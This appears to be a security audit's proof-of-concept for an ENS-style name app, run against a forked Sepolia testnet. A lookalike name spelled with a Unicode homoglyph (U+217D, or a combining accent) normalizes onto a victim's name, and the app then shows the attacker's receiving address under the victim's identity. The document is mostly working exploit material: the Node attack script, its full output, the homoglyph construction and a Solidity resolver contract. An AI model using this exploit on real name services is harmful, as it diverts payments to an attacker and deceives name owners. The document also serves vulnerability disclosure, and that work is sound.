const USDC = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39'
const VICTIM_WALLET = '0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57'
const VICTIM_RESOLVER = '0x75C7495CfD896FB78C4F6eF9f49Aa291232Cd116'
const ATTACKER_PK = '0x00000000000000000000000000000000000000000000000000000000a77ac6e5'

const W = 78
const rule = (c = '=') => console.log(c.repeat(W))
const say = (s = '') => console.log(s)
const act = (n, t) => { say(); rule(); say(`  ${n}  ${t}`); rule() }
const kv = (k, v) => say(`    ${String(k).padEnd(32)} ${v}`)
const cps = (s) => [...s].map((c) => 'U+' + c.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')).join(' ')
const eq = (a, b) => String(a).toLowerCase() === String(b).toLowerCase()
const must = (cond, msg) => { if (!cond) { say(`\n  ASSERTION FAILED: ${msg}`); process.exit(1) } }

// ---------------------------------------------------------------- anvil
const anvilBin = ['anvil', path.join(os.homedir(), '.foundry', 'bin', 'anvil')]
  .find((p) => spawnSync(p, ['--version'], { shell: true }).status === 0)
if (!anvilBin) { console.error('ERROR: anvil not found. Install foundry.'); process.exit(2) }

say(`\nforking live Sepolia on ${RPC} ...`)
const anvil = spawn(anvilBin, ['--fork-url', FORK_RPC, '--port', String(PORT),
  '--chain-id', '11155111', '--no-rate-limit', '--silent'], { shell: true, detached: false })
const killAnvil = () => {
  try { anvil.kill() } catch {}
  // shell:true means anvil.pid is the shell; on Windows take the tree down
  if (process.platform === 'win32' && anvil.pid) {
    try { spawnSync('taskkill', ['/pid', String(anvil.pid), '/t', '/f'], { stdio: 'ignore' }) } catch {}
  }
}
process.on('exit', killAnvil)
process.on('SIGINT', () => { killAnvil(); process.exit(130) })

const rpc = async (method, params = []) => (await (await fetch(RPC, {
  method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
})).json())

const chain = extendChainWithEns(sepolia)
const pc = createPublicClient({ chain, transport: http(RPC) })
for (let i = 0; i < 90; i++) {
  try { await pc.getBlockNumber(); break } catch { await new Promise((r) => setTimeout(r, 1000)) }
}
const forkBlock = await pc.getBlockNumber()
say(`forked at block ${forkBlock}`)

const attacker = privateKeyToAccount(ATTACKER_PK)
const wc = createWalletClient({ account: attacker, chain, transport: http(RPC) })

// ---------------------------------------------------------------------------
act('ACT 1', 'Two spellings of one name')
// ---------------------------------------------------------------------------
kv('victim name', JSON.stringify(VICTIM))
kv('  code points', cps(VICTIM))
kv('  namehash', namehash(VICTIM))
kv('attacker name', JSON.stringify(RAW))
kv('  code points', cps(RAW))
kv('  namehash', namehash(RAW))
say()
kv('normalizeEthName(attacker).name', JSON.stringify(normalizeEthName(RAW).name))
kv('  == the victim name', normalizeEthName(RAW).name === VICTIM)
kv('byte-identical', RAW === VICTIM)
must(normalizeEthName(RAW).name === VICTIM, 'the two names do not normalize together')
must(RAW !== VICTIM, 'the two strings are identical')
say()
say('  >> profileName.ts:18 says these are one name. namehash says they are two.')
say('     U+217D SMALL ROMAN NUMERAL ONE HUNDRED renders as a lowercase c.')

// ---------------------------------------------------------------------------
act('ACT 2', 'The attacker registers it. Real registrar, real price, fresh key.')
// ---------------------------------------------------------------------------
const erc20 = parseAbi([
  'function balanceOf(address) view returns (uint256)',
  'function approve(address,uint256) returns (bool)',
])
const reg = [...R.ethRegistrarRegisterSnippet, ...R.ethRegistrarCommitSnippet,
  ...R.ethRegistrarMakeCommitmentSnippet, ...R.ethRegistrarGetRegisterPriceSnippet]

kv('attacker wallet', attacker.address)
kv(`  code on Sepolia', (await pc.getCode({ address: attacker.address })) ?? '(none)`)
await rpc('anvil_setBalance', [attacker.address, '0x56BC75E2D63100000'])

// fund the attacker with USDC on the fork by writing the balance slot
let slot = null
for (let i = 0; i < 12; i++) {
  const key = keccak256(encodeAbiParameters(
    [{ type: 'address' }, { type: 'uint256' }], [attacker.address, BigInt(i)]))
  await rpc('anvil_setStorageAt', [USDC, key, pad(toHex(1_000_000_000n), { size: 32 })])
  if (await pc.readContract({ address: USDC, abi: erc20, functionName: 'balanceOf', args: [attacker.address] }) === 1_000_000_000n) { slot = i; break }
}
must(slot !== null, 'could not fund USDC on the fork')
kv('USDC funded via balance slot', slot)

const DURATION = 31536000n
const [base, premium] = await pc.readContract({ address: REGISTRAR, abi: reg, functionName: 'getRegisterPrice', args: [LABEL, DURATION, USDC] })
const total = base + premium
kv('getRegisterPrice(label,1y,USDC)', `${Number(total) / 1e6} USDC   (base ${base}, premium ${premium})`)
await wc.writeContract({ address: USDC, abi: erc20, functionName: 'approve', args: [REGISTRAR, total * 10n] })

// the attacker's resolver: answers for the name it is handed, accepts writes
// from anyone so resolverWriteAccess.ts's dry run returns true. Source in
// harness/AttackerResolver.sol, compiled bytecode inlined below.
// (compiled with solc 0.8.28; source in harness/AttackerResolver.sol)
const RESOLVER_BYTECODE = ATTACKER_RESOLVER_BYTECODE
const dh = await wc.sendTransaction({
  data: (RESOLVER_BYTECODE + encodeAbiParameters([{ type: 'address' }], [attacker.address]).slice(2)),
})
const { contractAddress: RESOLVER } = await pc.waitForTransactionReceipt({ hash: dh })
kv("attacker's resolver deployed", RESOLVER)

const secret = '0x' + '11'.repeat(32)
const ZERO = '0x0000000000000000000000000000000000000000'
const ZB = '0x' + '00'.repeat(32)
const commitment = await pc.readContract({ address: REGISTRAR, abi: reg, functionName: 'makeCommitment', args: [LABEL, attacker.address, secret, ZERO, RESOLVER, DURATION, ZB] })
await pc.waitForTransactionReceipt({ hash: await wc.writeContract({ address: REGISTRAR, abi: reg, functionName: 'commit', args: [commitment] }) })
await rpc('evm_increaseTime', [120]); await rpc('evm_mine', [])
const regTx = await wc.writeContract({ address: REGISTRAR, abi: reg, functionName: 'register', args: [LABEL, attacker.address, secret, ZERO, RESOLVER, DURATION, USDC, ZB] })
const regRc = await pc.waitForTransactionReceipt({ hash: regTx })
kv('ETHRegistrar.register', `${regRc.status}   tx ${regTx}`)
must(regRc.status === 'success', 'registration failed')
say()
say('  >> No label validity check, no normalization check. The registrar took')
say(`     a byte string that ENSIP-15 folds onto someone else\'s name, at the`)
say('     ordinary price, from a wallet with no relationship to the victim.')

// ---------------------------------------------------------------------------
act('ACT 3', 'One page, two questions, two different spellings')
// ---------------------------------------------------------------------------
// profileOwner.ts:25,56   normalizeEthName(param) -> ensjs getOwner
// profileRecords.ts:82,125  the raw param -> ensjs getRecords
for (const param of [VICTIM, RAW]) {
  const owner = await getOwner(pc, { name: normalizeEthName(param).name })
  const rec = await getRecords(pc, { name: param, texts: ['avatar', 'description'], coins: [60], contentHash: true, abi: true, ignoreInvalidCoinTypes: true })
  say(`  route param ${JSON.stringify(param)}`)
  kv('  owner leg (normalized)', owner)
  kv('  records leg (raw): resolver', rec.resolverAddress)
  kv('  records leg (raw): ETH addr', rec.coins.find((c) => c.coinType === 60)?.value ?? '(none)')
  say()
}
const ownerShown = await getOwner(pc, { name: normalizeEthName(RAW).name })
const recAttack = await getRecords(pc, { name: RAW, coins: [60], texts: ['description'], contentHash: true, abi: true, ignoreInvalidCoinTypes: true })
const addrShown = recAttack.coins.find((c) => c.coinType === 60)?.value
kv('owner shown is the victim', eq(ownerShown, VICTIM_WALLET))
kv('address shown is the attacker', eq(addrShown, attacker.address))
must(eq(ownerShown, VICTIM_WALLET), 'owner leg did not resolve to the victim')
must(eq(addrShown, attacker.address), 'records leg did not resolve to the attacker')
say()
say(`  >> The page prints the victim\'s owner, registration date and expiry, all`)
say(`     true, and the attacker\'s address under "Main receiving address", in a`)
say('     copy button (ProfileAddressesSection.tsx:90-94,130-142).')
say('     evidence/R1-victim-crypto.eth-full.png   the real page')
say(`     evidence/R2-attacker-lookalike-full.png  the attacker\'s page`)
say(`     One click on that card put the attacker\'s address on the clipboard.`)

// ---------------------------------------------------------------------------
act('ACT 4', "The app tells the visitor they own the attacker's name")
// ---------------------------------------------------------------------------
// ProfileView.tsx:119 -> isConnectedProfileOwner, fed by the NORMALIZED owner leg.
const isOwner = isConnectedProfileOwner({
  owner: ownerShown,            // profileOwner.ts:56, the NORMALIZED name
  walletAddress: VICTIM_WALLET, // the connected wallet
  accountAddress: undefined,
  ownerAddress: undefined,
})
kv('owner leg says the owner is', ownerShown)
kv('connected wallet', VICTIM_WALLET)
kv('isConnectedProfileOwner(...)', isOwner)
must(isOwner === true, 'the visitor was not treated as the owner')
say()
say('  >> ProfileEditAction.tsx:35 gates EDIT PROFILE on this. It renders, and the')
say(`     dialog shows "Your Ethereum Address" as the attacker's.`)
say()
say('  The same isOwner also suppresses the third-party renewal warning:')
kv('shouldShowThirdPartyRenewalWarning', shouldShowThirdPartyRenewalWarning(isOwner))
must(shouldShowThirdPartyRenewalWarning(isOwner) === false, 'the warning would still show')
const renewable = parseRenewableName(RAW)
must(renewable.isOk(), 'parseRenewableName rejected the lookalike')
const paidLabel = renewable.value.label
kv('parseRenewableName(raw).label', `${JSON.stringify(paidLabel)}   the attacker's`)
must(paidLabel === LABEL, "the paid label is not the attacker's")
const rprice = await pc.readContract({ address: REGISTRAR, abi: [...R.ethRegistrarGetRenewPriceSnippet], functionName: 'getRenewPrice', args: [paidLabel, DURATION, USDC] })
const rtotal = Array.isArray(rprice) ? rprice.reduce((a, b) => a + b, 0n) : rprice
kv('so RENEW NAME would charge', `${Number(rtotal) / 1e6} USDC to extend the attacker's name`)
say()
say('     ThirdPartyRenewalDialog.tsx:62-70 is the screen that would have said')
say('     "you will not gain ownership of the name". It never renders.')

// ---------------------------------------------------------------------------
act('ACT 5', 'What the victim sees, in a real browser')
// ---------------------------------------------------------------------------
say('  App under its own vite dev pointed at this fork, wallet connected as the')
say('  real owner of crypto.eth, real Chromium 1400x1400 at deviceScaleFactor 2.')
say()
say('  evidence/R2-attacker-lookalike-full.png')
say('    header reads crypto.eth, Owner 0x0a7b...bB57, and under')
say(`    "Main receiving address" the attacker's address. One click on that card`)
say('    put it on the clipboard.')
say()
say('  evidence/W1-owner-sees-own-name.png')
say('    the same page with the owner connected: EDIT PROFILE is enabled, and no')
say('    third-party renewal warning appears on RENEW NAME.')
say()
say('  evidence/W2-dialog-prefilled.png')
say(`    the Edit Profile dialog, Addresses tab. Under the app's own sentence`)
say('    "When someone sends funds to your name, it goes to your Ethereum')
say('    address", the field "Your Ethereum Address" is pre-filled with')
say(`    0x7738013316435525F00611fbc24fC48a3371688a, the attacker's.`)

// ---------------------------------------------------------------------------
say()
rule()
say('  IMPACT')
rule()
say(`  Victim name   ${JSON.stringify(VICTIM)}   owner ${VICTIM_WALLET}`)
say(`  Attacker name ${JSON.stringify(RAW)}   owner ${attacker.address}`)
say(`  Cost to the attacker  ${Number(total) / 1e6} USDC, one ordinary registration`)
say()
say('  The two names draw the same. The page says crypto.eth throughout and prints')
say(`  ${ownerShown} as the owner, which is true.`)
say()
say(`  A payer reads ${addrShown} as that name's`)
say('  receiving address. One click copies it.')
say()
say('  The owner is told the name is theirs: EDIT PROFILE renders, and the dialog')
say(`  shows "Your Ethereum Address" as ${addrShown},`)
say(`  the attacker's. RENEW NAME skips its warning and would charge ${Number(rtotal) / 1e6} USDC`)
say("  to extend the attacker's registration.")
say('  PoC PASSED, every assertion held.')
rule()
say()
killAnvil()
process.exit(0)
```

### Output

```

forking live Sepolia on http://127.0.0.1:8889 ...
forked at block 11636515

==============================================================================
  ACT 1  Two spellings of one name
==============================================================================
    victim name                      "crypto.eth"
      code points                    U+0063 U+0072 U+0079 U+0070 U+0074 U+006F U+002E U+0065 U+0074 U+0068
      namehash                       0xf1349714113694d6ed77f7a709bf992fc0297ad9e820d3083f0ab95376e51c02
    attacker name                    "ⅽrypto.eth"
      code points                    U+217D U+0072 U+0079 U+0070 U+0074 U+006F U+002E U+0065 U+0074 U+0068
      namehash                       0xa97fe66d0db5a58264028dda86fc9cd805dd5b070378b5770b141d444ee963a1

    normalizeEthName(attacker).name  "crypto.eth"
      == the victim name             true
    byte-identical                   false

  >> profileName.ts:18 says these are one name. namehash says they are two.
     U+217D SMALL ROMAN NUMERAL ONE HUNDRED renders as a lowercase c.

==============================================================================
  ACT 2  The attacker registers it. Real registrar, real price, fresh key.
==============================================================================
    attacker wallet                  0x7738013316435525F00611fbc24fC48a3371688a
      code on Sepolia', (await pc.getCode({ address: attacker.address })) ?? '(none) undefined
    USDC funded via balance slot     0
    getRegisterPrice(label,1y,USDC)  8.000021 USDC   (base 8000021, premium 0)
    attacker's resolver deployed     0x4ef4c5aeccf2be4338d997333d83432c35bef3f4
    ETHRegistrar.register            success   tx 0xe468863e3c0a21731c7dfd1d91e00db1fec1bd5be4bd81df156d623a460daf64

  >> No label validity check, no normalization check. The registrar took
     a byte string that ENSIP-15 folds onto someone else's name, at the
     ordinary price, from a wallet with no relationship to the victim.

==============================================================================
  ACT 3  One page, two questions, two different spellings
==============================================================================
  route param "crypto.eth"
      owner leg (normalized)         0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57
      records leg (raw): resolver    0x75C7495CfD896FB78C4F6eF9f49Aa291232Cd116
      records leg (raw): ETH addr    (none)

  route param "ⅽrypto.eth"
      owner leg (normalized)         0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57
      records leg (raw): resolver    0x4EF4C5AEcCF2Be4338D997333d83432C35bEf3f4
      records leg (raw): ETH addr    0x7738013316435525F00611fbc24fC48a3371688a

    owner shown is the victim        true
    address shown is the attacker    true

  >> The page prints the victim's owner, registration date and expiry, all
     true, and the attacker's address under "Main receiving address", in a
     copy button (ProfileAddressesSection.tsx:90-94,130-142).
     evidence/R1-victim-crypto.eth-full.png   the real page
     evidence/R2-attacker-lookalike-full.png  the attacker's page
     One click on that card put the attacker's address on the clipboard.

==============================================================================
  ACT 4  The app tells the visitor they own the attacker's name
==============================================================================
    owner leg says the owner is      0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57
    connected wallet                 0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57
    isConnectedProfileOwner(...)     true

  >> ProfileEditAction.tsx:35 gates EDIT PROFILE on this. It renders, and the
     dialog shows "Your Ethereum Address" as the attacker's.

  The same isOwner also suppresses the third-party renewal warning:
    shouldShowThirdPartyRenewalWarning false
    parseRenewableName(raw).label    "ⅽrypto"   the attacker's
    so RENEW NAME would charge       8.000021 USDC to extend the attacker's name

     ThirdPartyRenewalDialog.tsx:62-70 is the screen that would have said
     "you will not gain ownership of the name". It never renders.

==============================================================================
  ACT 5  What the victim sees, in a real browser
==============================================================================
  App under its own vite dev pointed at this fork, wallet connected as the
  real owner of crypto.eth, real Chromium 1400x1400 at deviceScaleFactor 2.

  evidence/R2-attacker-lookalike-full.png
    header reads crypto.eth, Owner 0x0a7b...bB57, and under
    "Main receiving address" the attacker's address. One click on that card
    put it on the clipboard.

  evidence/W1-owner-sees-own-name.png
    the same page with the owner connected: EDIT PROFILE is enabled, and no
    third-party renewal warning appears on RENEW NAME.

  evidence/W2-dialog-prefilled.png
    the Edit Profile dialog, Addresses tab. Under the app's own sentence
    "When someone sends funds to your name, it goes to your Ethereum
    address", the field "Your Ethereum Address" is pre-filled with
    0x7738013316435525F00611fbc24fC48a3371688a, the attacker's.

==============================================================================
  IMPACT
==============================================================================
  Victim name   "crypto.eth"   owner 0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57
  Attacker name "ⅽrypto.eth"   owner 0x7738013316435525F00611fbc24fC48a3371688a
  Cost to the attacker  8.000021 USDC, one ordinary registration

  The two names draw the same. The page says crypto.eth throughout and prints
  0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57 as the owner, which is true.

  A payer reads 0x7738013316435525F00611fbc24fC48a3371688a as that name's
  receiving address. One click copies it.

  The owner is told the name is theirs: EDIT PROFILE renders, and the dialog
  shows "Your Ethereum Address" as 0x7738013316435525F00611fbc24fC48a3371688a,
  the attacker's. RENEW NAME skips its warning and would charge 8.000021 USDC
  to extend the attacker's registration.
  PoC PASSED, every assertion held.
==============================================================================
```

## Attack code

The label. Built from a code point, because an editor or a shell will silently normalize a pasted literal and register the wrong name.

```js
const LABEL = String.fromCodePoint(0x217D) + 'rypto'   // U+217D draws as "c"
// normalize(LABEL + '.eth') === 'crypto.eth'

encodeFunctionData({
  abi: ethRegistrarRegisterSnippet,
  functionName: 'register',
  args: [LABEL, attacker, secret, zeroAddress, attackerResolver, duration, USDC, referrer],
})
// -> success, 8.000021 USDC
```

For a pair that is identical glyph for glyph rather than merely close, use a combining accent. Six such pairs are already live on the audited deployment:

```js
const victim   = 'ébf-f51f02a5.eth'                               // é as one code point
const attacker = 'e' + String.fromCodePoint(0x0301) + 'bf-f51f02a5.eth' // e + combining acute
// normalize(attacker) === victim, and they draw the same in every font
```

The resolver the name points at. It answers for the name it is handed, so the profile page shows the attacker's address under the victim's identity.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract AttackerResolver {
    address public attacker;
    constructor(address _attacker) { attacker = _attacker; }

    function addr(bytes32, uint256 coinType) external view returns (bytes memory) {
        if (coinType == 60) return abi.encodePacked(attacker);
        return "";
    }
    function addr(bytes32) external view returns (address) { return attacker; }
    function text(bytes32, string calldata) external pure returns (string memory) { return ""; }

    function supportsInterface(bytes4 id) external pure returns (bool) {
        return id == 0x01ffc9a7 || id == 0x3b3b57de || id == 0xf1cb7e06
            || id == 0x59d1d43c || id == 0xbc1c58d1 || id == 0x2203ab56;
    }
}
```

```
plant : register the lookalike, point it at the resolver above
fire  : the victim opens the attacker's name

payer -> the page shows the attacker's address under "Main receiving address",
         beside the victim's true ownership. One click copies it.

owner -> the same page tells them the name is theirs. EDIT PROFILE renders and
         shows "Your Ethereum Address" as the attacker's. renew successful.
```
